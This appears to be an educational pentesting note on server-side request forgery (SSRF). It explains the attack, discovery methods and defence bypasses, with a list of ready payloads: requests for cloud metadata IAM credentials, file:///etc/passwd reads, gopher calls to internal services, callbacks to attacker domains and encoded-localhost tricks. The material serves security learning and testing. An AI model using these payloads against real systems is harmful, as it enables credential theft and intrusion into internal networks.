# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server perform unauthorized requests to internal or external systems on behalf of the attacker. This occurs when a web application fetches a resource from a URL or makes an HTTP request using user-supplied input, and the application does not properly validate or restrict the target of the request. 

SSRF enables attackers to manipulate these requests to access internal services (such as database endpoints, cloud metadata services, or internal APIs) that are not normally exposed to the internet. In severe cases, SSRF can lead to unauthorized access, sensitive data leakage, server compromise, and even full control over the vulnerable system if misconfigured.

SSRF can also be leveraged to bypass security controls such as firewalls or VPNs and pivot to other systems within the internal network, potentially leading to lateral movement across an organization's infrastructure.

# How Server-Side Request Forgery Works

Server-Side Request Forgery exploits the trust a server has in its internal or external network services. The attacker manipulates the server to make requests on their behalf. Below is a step-by-step explanation of how SSRF works:

1. **User Input Determines Target URL:** The application accepts user input (via URL parameters, forms, or headers) to construct a request to another resource. This resource could be an API endpoint, a web page, or a service.
   - Example: A web application might allow a user to input a URL to fetch a preview of that webpage (e.g., for embedding or link validation purposes).

2. **Attacker Manipulates Input:** Instead of supplying a valid external URL, the attacker modifies the input to target internal systems, metadata services, or unauthorized endpoints.
   - Example: Instead of providing a URL like `http://example.com`, the attacker could supply a URL like `http://127.0.0.1/admin`, forcing the server to make a request to its internal administration panel.
3. **Server Sends Request:** The server processes the request and forwards it to the target URL provided by the attacker. Since the request originates from the server itself, it can access internal resources that are otherwise inaccessible from the outside.
   - Example: The server accesses internal services like `http://localhost` or `http://169.254.169.254/latest/meta-data/`, which are otherwise protected behind firewalls.
4. **Attacker Gains Access or Exfiltrates Data:** The response from the internal service is sent back to the attacker. Depending on the target, the attacker may access sensitive information (such as AWS instance metadata), internal files, or internal APIs.
   - In some cases, the attacker can chain SSRF with Remote Code Execution (RCE) vulnerabilities by targeting services that execute commands based on the request.

# Types of Server-Side Request Forgery

SSRF can be classified into different types based on the target and the way it is exploited:

## Basic SSRF
- Basic SSRF occurs when the attacker can control the entire URL sent by the server. This allows them to request resources from both internal and external services.

### How Basic SSRF Works
1. The attacker identifies an input field or parameter where they can control the URL.
2. They modify the input to request internal or external resources, such as internal admin panels or cloud services.
3. The server makes the request, and the attacker receives the response.

**Example:**
```
http://<target_domain>/fetch?url=http://127.0.0.1/admin
```
In this case, the attacker uses SSRF to access the serverâ€™s internal administration panel.

## Blind SSRF
- Blind SSRF occurs when the attacker cannot see the response of the forged request. However, they can still send requests to internal services and deduce success based on side effects (e.g., timing delays, logs, or out-of-band interactions).

### How Blind SSRF Works
1. The attacker manipulates the target URL to request internal resources.
2. They cannot see the response but observe side effects, such as server delays, DNS queries, or log entries.
3. The attacker can confirm whether the request was successful through indirect indicators.

**Example:**
```
http://<target_domain>/fetch?url=http://169.254.169.254/latest/meta-data/
```
Even if the response is not visible, the attacker may confirm the request worked by using timing-based analysis or network monitoring.

## SSRF with Internal Pivoting
- In this scenario, SSRF allows the attacker to use the vulnerable server as a proxy to access internal services, bypassing firewalls and network segmentation.

### How SSRF with Internal Pivoting Works
1. The attacker identifies a vulnerable server exposed to the internet.
2. They use SSRF to access internal services (e.g., databases, API servers, or management interfaces) that would otherwise be unreachable from the outside world.
3. They may extract data from the internal network or interact with internal systems to escalate the attack.

**Example:**
```
http://<target_domain>/fetch?url=http://internal-database:3306
```
Here, the attacker is using SSRF to attempt to access an internal database server that is not publicly accessible.

# Manual Discovery Techniques for SSRF

Detecting SSRF vulnerabilities manually involves exploring input fields and parameters that make server-side HTTP requests and testing for behavior that indicates a lack of proper validation or access control.

### 1. Identify User-Supplied URLs
- Look for any functionality that accepts URLs or references to external resources. Common areas include:
  - URL preview features.
  - Image or file upload services (where external URLs are fetched).
  - API integrations that accept user-defined endpoints.

### 2. Test with Internal IP Addresses
- Test by injecting internal IP addresses or localhost to see if the server makes requests to internal services.
  **Example:**
  ```
  http://<target_domain>/fetch?url=http://localhost
  http://<target_domain>/fetch?url=http://localhost:80/
  http://<target_domain>/fetch?url=http://127.0.0.1
  http://<target_domain>/fetch?url=http://127.0.0.1:80/
  http://<target_domain>/fetch?url=http://169.254.169.254/latest/meta-data/
  ```
  
  If the server responds or the application hangs, it may indicate SSRF.

### 3. Blind SSRF Testing Using Out-of-Band (OOB) Channels
- For blind SSRF, inject external URLs pointing to servers you control to verify if the target system is making requests. Tools like **Burp Collaborator** or **DNSBin** can capture these requests.
  **Example:**
  ```
  http://<target_domain>/fetch?url=http://<attacker_domain>/log
  ```

  If you receive a request on your server, the target is vulnerable to SSRF.

### 4. Test with File Protocols and Alternative Schemes
- In some cases, the application may allow other protocols like `file://`, `gopher://`, or `ftp://`. These can be used to access sensitive files or perform other attacks.
  **Example:**
  ```
  http://<target_domain>/fetch?url=htttp://localhost:80/
  http://<target_domain>/fetch?url=ftp://localhost:21/
  http://<target_domain>/fetch?url=file:///etc/passwd
  ```

  If the content of the file is returned, the server is vulnerable.

### 5. Use Burp Suite to Intercept and Modify Requests
- Use Burp Suite to intercept and modify the URL parameters that accept external URLs. Change the target to local or sensitive resources.

- **Example Interception:**
	```
	POST /fetch HTTP/1.1
	Host: <target_domain>
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 45
	
	url=http://127.0.0.1/admin
	```

  Modify the `url` parameter to target an internal service.

# SSRF Payloads

Here are several SSRF payloads used to exploit this vulnerability:

## Basic Payloads
- These payloads are used to test for basic SSRF vulnerabilities.
    ```
    http://<target_domain>/fetch?url=http://localhost
    http://<target_domain>/fetch?url=http://localhost:80/
    http://<target_domain>/fetch?url=http://127.0.0.1
    http://<target_domain>/fetch?url=http://127.0.0.1:80/
    http://<target_domain>/fetch?url=http://169.254.169.254/latest/meta-data/
    ```

## Access Internal Web Services
- Access internal web services such as admin interfaces or databases by targeting localhost or internal IPs.
    ```
    http://127.0.0.1:80/admin
    http://10.0.0.1:8080/
    ```

## DNS Rebinding
-  Use the vulnerable server as a proxy to access internal services.
	```
	http://<target_domain>/fetch?url=http://rebind.attacker.com
	```

## Port Scanning
- Use the vulnerable server to redirect to potentially open ports.
	```
	http://<target_domain>/fetch?url=http://localhost:22
	http://<target_domain>/fetch?url=http://localhost:3306
	```

## File Protocol Exploitation
- Exploit the `file://` protocol to access local files.
	```
	http://<target_domain>/fetch?url=htttp://localhost:80/
	http://<target_domain>/fetch?url=ftp://localhost:21/
	http://<target_domain>/fetch?url=file:///etc/passwd
	```

## Cloud Metadata Service (AWS)
- Access AWS instance metadata service to retrieve credentials or sensitive instance information.
	```
	http://169.254.169.254/latest/meta-data/
	```

- Extract IAM credentials:
	```
	http://169.254.169.254/latest/meta-data/iam/security-credentials/
	```

## External DNS or HTTP Requests (OOB Detection)
- Use an external URL to confirm if the server is making outbound requests. This can be useful in blind SSRF.
	```
	http://<attacker_domain>/log
	```

## Gopher Protocol Exploitation (RCE)
- In rare cases, using the `gopher://` protocol can be used to exploit internal services that expect specific payloads, such as SQL injections or Redis commands.
	```
	gopher://localhost:3306/_SQL_PAYLOAD
	```

# Bypassing Defenses

Here are techniques to bypass common SSRF defenses:

## Bypass Input Validation
- Applications may use simple checks for strings like `localhost` or `127.0.0.1`. Bypass these filters using alternative IP notations:
  - **Hexadecimal IP:** `http://0x7f000001`
  - **Octal IP:** `http://0177.0000.0000.0001`
  - **Dotted Decimal:** `http://127.1`

## Bypass Blacklists
- Some applications blacklist certain keywords or IP ranges. Use alternative domain names or subdomains:
  - Use `localhost.com` (if it resolves to `127.0.0.1`).
  - Use internal DNS names that resolve to internal IPs.

## Exploit Alternative Protocols
- Some applications only check for HTTP/HTTPS. You can bypass these filters by using other schemes like `ftp://`, `file://`, `gopher://`, or even `ldap://`.

## Use DNS Rebinding
- Bypass filters by using DNS rebinding, which allows a domain name to resolve to an internal IP after an initial resolution. This technique can bypass restrictions on IP addresses.
  **Example:**
  1. The server requests `http://attacker.com`.
  2. The DNS server first resolves `attacker.com` to a public IP.
  3. Upon subsequent requests, it resolves `attacker.com` to `127.0.0.1`, bypassing the filter.

## Use URL Encoded Variants
- Encode sensitive strings (like `localhost`) in different ways to bypass string filters:
  ```
  http://%31%32%37%2E%30%2E%30%2E%31/admin
  ```

## Chaining SSRF with Other Vulnerabilities
- Combine SSRF with other vulnerabilities like open redirects or remote code execution (RCE) to escalate the attack.

```
http://attacker.com/capture?url=<script>location.href='http://internal-service.local'</script>
```

## Deny List
A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list.

### Exploit
Attackers can bypass a Deny List by using alternative localhost references such as:
- `0`
- `0.0.0.0`
- `0000`
- `127.1`
- `127.*.*.*`
- `2130706433`
- `017700000001`
- subdomains that have a DNS record which resolves to the IP Address `127.0.0.1` such as `127.0.0.1.nip.io`

Also, in a cloud environment, it would be beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.

## Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with `https://website.com`.

### Exploit
An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as `https://website.com.attackers-domain.com`. The application logic would now allow this input and let an attacker control the internal HTTP request.

# Resources

|**Website**|**URL**|
|-|-|
|OWASP SSRF|https://owasp.org/www-community/attacks/Server_Side_Request_Forgery|
|PortSwigger SSRF|https://portswigger.net/web-security/ssrf|
|HackTricks SSRF Guide|https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery|
|PayloadAllTheThings (SSRF)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF|
|Exploit Database SSRF|https://www.exploit-db.com/|
|Burp Collaborator|https://portswigger.net/burp/documentation/collaborator|
|Pentest-Tools SSRF Scanner|https://pentest-tools.com/|
|SSRF Cheat Sheet|https://github.com/tijme/SSRFmap|